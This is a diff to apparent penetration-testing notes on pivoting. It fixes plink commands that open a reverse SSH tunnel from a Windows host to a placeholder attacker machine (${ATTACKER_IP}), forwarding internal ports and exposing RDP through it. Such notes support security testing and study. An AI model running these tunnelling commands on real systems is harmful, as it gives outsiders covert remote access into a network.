@@ -16,13 +16,15 @@ If you are getting an error about algorithm choice when calling plink, consider 
 assuming we have `plink.exe` available on the windows host, we can do remote port forwarding with:
 
 ```
-cmd.exe /c echo y | plink.exe -ssh -l ${ATTACKER_USER} -pw ${ATTACKER_PW} -R 127.0.0.1:${LISTENING_PORT}:${EXTERNAL_PORT}:${EXTERNAL_IP} ${ATTACKER_IP} 
+cmd.exe /c echo y | .\plink.exe -ssh -l ${ATTACKER_USER} -pw ${ATTACKER_PW} -R 127.0.0.1:${LISTENING_PORT}:${EXTERNAL_IP}:${EXTERNAL_PORT} ${ATTACKER_IP} 
 ```
-(note the pipe command which answers `y` to the question about keys).
+
+
+(note the pipe command which answers `y` to the question about keys. The second time you do it, leave out the piping).
 This can also be used to expose RDP:
 
 ```
-cmd.exe /c echo y | plink.exe -ssh -l ${ATTACKER_USER} -pw ${ATTACKER_PW} -R 127.0.0.1:${LISTENING_PORT}:127.0.0.1:3389 ${ATTACKER_IP} 
+cmd.exe /c echo y | .\plink.exe -ssh -l ${ATTACKER_USER} -pw ${ATTACKER_PW} -R 127.0.0.1:${LISTENING_PORT}:127.0.0.1:3389 ${ATTACKER_IP} 
 ```
 
 Now, you can do the following from `${ATTACKER_IP}`:
